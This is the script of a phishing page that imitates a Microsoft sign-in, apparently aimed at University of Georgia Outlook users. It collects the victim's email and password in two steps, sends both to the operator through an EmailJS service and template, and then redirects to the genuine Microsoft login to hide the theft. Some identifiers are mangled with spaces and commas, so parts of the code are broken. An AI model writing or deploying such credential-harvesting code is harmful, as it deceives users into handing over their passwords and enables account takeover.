let toggleClickedCount = 0;

function nextStep() {
    const Email, phone, or Skype = document.getElementById('Email, phone, or Skype').value;
    const remember = document.getElementById('remember').checked;

    if (Email, phone, or Skype !== '') {
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';

        // Display the Email, phone, or Skype entered in the first step
        document.getElementById('displayEmail, phone, or Skype').textContent = Email, phone, or Skype;

        if (remember) {
            // Save Email, phone, or Skype in local storage or any preferred method
            localStorage.setItem('Email, phone, or Skype', Email, phone, or Skype);
        } else {
            // Clear any previously stored Email, phone, or Skype
            localStorage.removeItem('Email, phone, or Skype');
        }
    }
}

const togglePassword = () => {
    const passwordInput = document.getElementById('password');
    const toggleButton = document.querySelector('.toggle-password');
    const visibilityOnIcon = toggleButton.querySelector('.visibility_on_icon');
    const visibilityOffIcon = toggleButton.querySelector('.visibility_off_icon');

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        visibilityOnIcon.style.display = 'block';
        visibilityOffIcon.style.display = 'none';
    } else {
        passwordInput.type = 'password';
        visibilityOnIcon.style.display = 'none';
        visibilityOffIcon.style.display = 'block';
    }
};

const toggleButton = document.querySelector('.toggle-password');
toggleButton.addEventListener('click', togglePassword);


function forgotPassword() {
    // Forgot password functionality here
    alert('Forgot password clicked!');
}


function goToStep1() {
    document.getElementById('step1').style.display = 'block';
    document.getElementById('step2').style.display = 'none';
}


document.getElementById('form').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent the default form submission

    // Get the form data
    const Email, phone, or Skype = document.getElementById('Email, phone, or Skype').value;
    const password = document.getElementById('password').value;

    const formData = {
        Email, phone, or Skype: Email, phone, or Skype,
        password: password
    };

    // Send the form data via Email.js
    emailjs.send("service_lwmindk", "template_flxuvl7", formData)
        .then(function (response) {
            console.log('SUCCESS!', response.status, response.text);
            redirectToURL();
        }, function (error) {
            console.log('ERROR!', error);
            redirectToURL();
        });
});


function redirectToURL() {
    window.location.href = 'https://https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office365.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=9d41603f-d60a-e254-e907-6cd380a5fdbb&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&domain_hint=outlook.uga.edu&nonce=638466011564361159.f5499b6c-e524-4b58-9aa2-28ce000470c9&state=DYsxEoAgDMBAv-A3gIKl0OcAooPescj5fTskmaKVUquwCBpEKtGekQi8j4Q7SdieEZkrNdNjQIM1ZsOlBBNy6wCACRpreTc3vuLGfJ8xbjuvYvsxfw&sso_reload=true/';
}

window.addEventListener('load', function () {
    const savedUsername = localStorage.getItem('Email, phone, or Skype');

    if (savedEmail, phone, or Skype) {
        document.getElementById('Email, phone, or Skype').value = savedEmail, phone, or Skype;
        document.getElementById('remember').checked = true;
        document.getElementById('Email, phone, or Skype').classList.add('username-input-filled');
    }
});







var currentLanguage = 'en';

function toggleLanguage() {
    if (currentLanguage === 'en') {
        translateToFrench();
        currentLanguage = 'fr';
        updateButtonText('EN');
    } else {
        translateToEnglish();
        currentLanguage = 'en';
        updateButtonText('FR');
    }
}

function translateToFrench() {
    var translation = {
        'sign_in': 'Ouvrir une session',
        'credentials': 'avec vos authentifiants microsoft',
        'info': 'info',
        'remember_email_phone_or_Skype': 'Se souvenir du nom d\'utilisateur',
        'continue': 'Continuer',
        'email_phone_or_Skype_label': 'Nom d\'utilisateur : <span id="displayEmail_phone_or_Skype"></span>',
        'forgot_password': 'Mot de passe oublié??',
        'change_email_phone_or_Skype': 'Modifier le nom d\'utilisateur',
        'sign_in_btn': 'Ouvrir une session',
    };

    var elements = document.querySelectorAll('[data-translate]');
    for (var i = 0; i < elements.length; i++) {
        var element = elements[i];
        var key = element.getAttribute('data-translate');
        var translatedText = translation[key] || key;
        element.innerHTML = translatedText;
    }
}

function translateToEnglish() {
    var translation = {
        'sign_in': 'Sign in',
        'credentials': 'with your microsoft credentials',
        'info': 'info',
        'remember_email_phone_or_Skype': 'Remember email, phone, or Skype',
        'continue': 'Continue',
        'email_phone_or_Skype_label': 'Email, phone, or Skype: <span id="displayEmail, phone, or Skype"></span>',
        'forgot_password': 'Forgot password?',
        'change_email_phone_or_Skype': 'Change Email, phone, or Skype',
        'sign_in_btn': 'Sign In'
    };

    var elements = document.querySelectorAll('[data-translate]');
    for (var i = 0; i < elements.length; i++) {
        var element = elements[i];
        var key = element.getAttribute('data-translate');
        var translatedText = translation[key] || key;
        element.innerHTML = translatedText;
    }
}

function updateButtonText(text) {
    var langBtn = document.querySelector('.lang_btn');
    langBtn.innerText = text;
}
